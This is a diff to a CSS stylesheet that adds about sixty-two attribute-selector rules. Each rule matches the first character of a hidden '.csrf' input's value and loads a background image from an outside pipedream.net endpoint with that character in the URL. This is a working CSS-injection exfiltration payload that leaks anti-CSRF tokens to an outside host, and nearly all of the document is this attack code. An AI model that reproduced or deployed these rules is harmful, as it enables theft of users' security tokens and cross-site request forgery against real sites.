@@ -108,10 +108,254 @@ form > input:focus, form > textarea:focus {
 form > input[type='submit'] {
 	width: 10em;
 }
-
 .csrf {
         visibility: hidden;
 }
+       
 .csrf[value^="a"] { 
-	background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?a); 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?a); 
+}
+           
+.csrf[value^="b"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?b); 
+}
+           
+.csrf[value^="c"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?c); 
+}
+           
+.csrf[value^="d"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?d); 
+}
+           
+.csrf[value^="e"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?e); 
+}
+           
+.csrf[value^="f"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?f); 
+}
+           
+.csrf[value^="g"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?g); 
+}
+           
+.csrf[value^="h"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?h); 
+}
+           
+.csrf[value^="i"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?i); 
+}
+           
+.csrf[value^="j"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?j); 
+}
+           
+.csrf[value^="k"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?k); 
+}
+           
+.csrf[value^="l"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?l); 
+}
+           
+.csrf[value^="m"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?m); 
+}
+           
+.csrf[value^="n"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?n); 
+}
+           
+.csrf[value^="o"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?o); 
+}
+           
+.csrf[value^="p"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?p); 
+}
+           
+.csrf[value^="q"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?q); 
+}
+           
+.csrf[value^="r"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?r); 
+}
+           
+.csrf[value^="s"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?s); 
+}
+           
+.csrf[value^="t"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?t); 
+}
+           
+.csrf[value^="u"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?u); 
+}
+           
+.csrf[value^="v"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?v); 
+}
+           
+.csrf[value^="w"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?w); 
+}
+           
+.csrf[value^="x"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?x); 
+}
+           
+.csrf[value^="y"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?y); 
+}
+           
+.csrf[value^="z"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?z); 
+}
+           
+.csrf[value^="A"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?A); 
+}
+           
+.csrf[value^="B"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?B); 
+}
+           
+.csrf[value^="C"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?C); 
+}
+           
+.csrf[value^="D"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?D); 
+}
+           
+.csrf[value^="E"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?E); 
+}
+           
+.csrf[value^="F"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?F); 
+}
+           
+.csrf[value^="G"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?G); 
+}
+           
+.csrf[value^="H"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?H); 
+}
+           
+.csrf[value^="I"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?I); 
+}
+           
+.csrf[value^="J"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?J); 
+}
+           
+.csrf[value^="K"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?K); 
+}
+           
+.csrf[value^="L"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?L); 
+}
+           
+.csrf[value^="M"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?M); 
+}
+           
+.csrf[value^="N"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?N); 
+}
+           
+.csrf[value^="O"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?O); 
+}
+           
+.csrf[value^="P"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?P); 
+}
+           
+.csrf[value^="Q"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?Q); 
+}
+           
+.csrf[value^="R"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?R); 
+}
+           
+.csrf[value^="S"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?S); 
+}
+           
+.csrf[value^="T"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?T); 
+}
+           
+.csrf[value^="U"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?U); 
+}
+           
+.csrf[value^="V"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?V); 
+}
+           
+.csrf[value^="W"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?W); 
+}
+           
+.csrf[value^="X"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?X); 
+}
+           
+.csrf[value^="Y"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?Y); 
+}
+           
+.csrf[value^="Z"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?Z); 
+}
+           
+.csrf[value^="0"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?0); 
+}
+           
+.csrf[value^="1"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?1); 
+}
+           
+.csrf[value^="2"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?2); 
+}
+           
+.csrf[value^="3"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?3); 
+}
+           
+.csrf[value^="4"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?4); 
+}
+           
+.csrf[value^="5"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?5); 
+}
+           
+.csrf[value^="6"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?6); 
+}
+           
+.csrf[value^="7"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?7); 
+}
+           
+.csrf[value^="8"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?8); 
+}
+           
+.csrf[value^="9"] { 
+background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?9); 
 }
